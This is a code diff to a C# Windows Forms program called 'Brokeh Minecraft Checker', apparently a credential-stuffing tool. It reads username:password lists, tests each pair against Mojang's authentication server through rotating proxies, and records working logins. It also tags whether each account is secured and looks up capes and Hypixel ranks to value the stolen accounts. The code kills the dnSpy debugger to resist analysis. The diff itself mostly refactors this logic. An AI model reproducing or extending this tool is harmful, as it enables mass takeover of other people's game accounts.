@@ -6,6 +6,7 @@ using System.Net;
 using System.Runtime.CompilerServices;
 using System.Threading;
 using System.Windows.Forms;
+using Brokeh_Minecraft_Checker.Common;
 using Newtonsoft.Json;
 using xNet;
 
@@ -13,6 +14,11 @@ namespace Brokeh_Minecraft_Checker
 {
     public partial class Form1 : Form
     {
+        private static readonly List<AccountExtra> EnabledExtras = new List<AccountExtra>()
+        {
+            new OptifineCapeExtra()
+        };
+
         public sealed override string Text
         {
             get => base.Text;
@@ -21,9 +27,11 @@ namespace Brokeh_Minecraft_Checker
 
         private const string Version = "2.4.0";
         private const string AuthServerEndpoint = "https://authserver.mojang.com/authenticate";
+        private const string Changelog = "Added dark theme and internal changes.";
 
-        private readonly Random _random = new Random();
+        private readonly Random _random;
         private readonly object _monitor;
+        private readonly List<Account> _resolvedAccounts;
 
         private Queue<string> _queue;
         private int _countGood;
@@ -36,15 +44,16 @@ namespace Brokeh_Minecraft_Checker
         private string[] _accounts;
         private string[] _proxies;
 
-        string changelog = "added dark theme and internal changes.";
 
         public Form1(string hardwareId)
         {
-            Program.KillDnSpyProcessByName();
+            _resolvedAccounts = new List<Account>();
+            _random = new Random();
+            _monitor = RuntimeHelpers.GetObjectValue(new object());
 
+            Program.KillDnSpyProcessByName();
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false;
-            _monitor = RuntimeHelpers.GetObjectValue(new object());
 
             var wC = new WebClient();
 
@@ -52,7 +61,7 @@ namespace Brokeh_Minecraft_Checker
             if (resposta.Contains("OK|"))
             {
                 string username = resposta.Replace("OK|", "");
-                Text = $"Brokeh Minecraft Checker v-{Version} [User: {username}] [{Version}: {changelog}]";
+                Text = $"Brokeh Minecraft Checker v-{Version} [User: {username}] [{Version}: {Changelog}]";
             }
             else if (resposta.Contains("Not authorized!"))
             {
@@ -155,15 +164,14 @@ namespace Brokeh_Minecraft_Checker
 
             while (_queue.Count > 0)
             {
-                var objectValue = RuntimeHelpers.GetObjectValue(_monitor);
+                var monitor1 = RuntimeHelpers.GetObjectValue(_monitor);
                 bool flag = false;
-                object objectValue3;
                 string text = "";
                 Program.KillDnSpyProcessByName();
 
-                object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
-                objectValue3 = RuntimeHelpers.GetObjectValue(objectValue2);
-                Monitor.Enter(RuntimeHelpers.GetObjectValue(objectValue2), ref flag);
+                var monitor2 = RuntimeHelpers.GetObjectValue(monitor1);
+                var monitor3 = RuntimeHelpers.GetObjectValue(monitor2);
+                Monitor.Enter(RuntimeHelpers.GetObjectValue(monitor2), ref flag);
                 try
                 {
                     text = _queue.Peek().Replace("\r", "");
@@ -176,12 +184,12 @@ namespace Brokeh_Minecraft_Checker
 
                 if (flag)
                 {
-                    Monitor.Exit(RuntimeHelpers.GetObjectValue(objectValue3));
+                    Monitor.Exit(RuntimeHelpers.GetObjectValue(monitor3));
                 }
 
                 try
                 {
-                    string[] account = text.Split(':');
+                    string[] accountData = text.Split(':');
                     using (var httpRequest = new HttpRequest())
                     {
                         // Parse proxy, if https is not checked it will try with Socks5
@@ -189,7 +197,7 @@ namespace Brokeh_Minecraft_Checker
                             (https.Checked ? ProxyType.Http : ProxyType.Socks5),
                             proxyAddress);
 
-                        string payload = PrepareRequest(httpRequest, account);
+                        string payload = PrepareRequest(httpRequest, accountData);
 
                         try
                         {
@@ -213,58 +221,41 @@ namespace Brokeh_Minecraft_Checker
                                 continue;
                             }
 
-                            string extras = "";
                             var results = JsonConvert.DeserializeObject<dynamic>(response);
 
                             string nick = results.availableProfiles[0].name;
+                            var account = new Account(nick, accountData[1])
+                            {
+                                Proxy = proxyAddress
+                            };
+                            _resolvedAccounts.Add(account);
 
+                            string accountType;
                             try
                             {
-                                if (results.user.secured == true)
-                                {
-                                    extras += "SFA: False | ";
-                                }
-                                else
-                                {
-                                    extras += "SFA: True | ";
-                                }
+                                // Check if the account is Not full access or semi access
+                                accountType = results.user.secured ? "NFA" : "SFA";
                             }
                             catch (Exception)
                             {
-                                extras += "SFA: Undefined | ";
+                                accountType = "None";
                             }
 
-                            // OPTIFINE CAPE CHECKER
-                            string resposta2 = httpRequest
-                                .Get("https://mmvyoutube.pw/check/v1.0/cape/optifine.php?username=" + nick)
-                                .ToString();
-                            extras += "Optifine Cape: " + resposta2 + " | ";
+                            account.Type = accountType;
 
-                            // MINECON AND UNMIGRATED CHECKER (NAMEMC.COM)
-                            string resposta3 = httpRequest
-                                .Get("https://mmvyoutube.pw/check/v1.0/cape/minecon.php?username=" + nick)
-                                .ToString();
-                            extras += "Minecon Cape: " + resposta3 + " | ";
+                            EnabledExtras.ForEach(extra =>
+                            {
+                                bool f = extra.CheckExtra(new HttpRequest(), account);
+                                if (f) account.Extras.Add(extra);
+                            });
 
-                            string respostaUnmigrated = httpRequest
-                                .Get("https://mmvyoutube.pw/check/v1.0/mojang/migration.php?username=" +
-                                     nick).ToString();
-                            extras += respostaUnmigrated + " | ";
-
-                            string resposta4 = httpRequest
-                                .Get("https://mmvyoutube.pw/check/v1.0/rank/hypixel.php?username=" + nick)
-                                .ToString();
-                            extras += "Hypixel Rank: " + resposta4 + " | ";
-
-                            aprovadas.AppendText("GOOD | " + account[0] + " | " + account[1] + " | NICK: " +
-                                                 nick + " | " + extras + " | PROXY: " + proxyAddress +
-                                                 " | #BrokehChecker" + Environment.NewLine);
+                            aprovadas.AppendText("GOOD | " + account + Environment.NewLine);
 
                             _countGood++;
                         }
                         catch (Exception)
                         {
-                            proxyAddress = _proxies[_random.Next(1, _proxies.Length)];
+                            proxyAddress = _proxies[_random.Next(0, _proxies.Length)];
                             _queue.Enqueue(text);
                             _countError++;
 
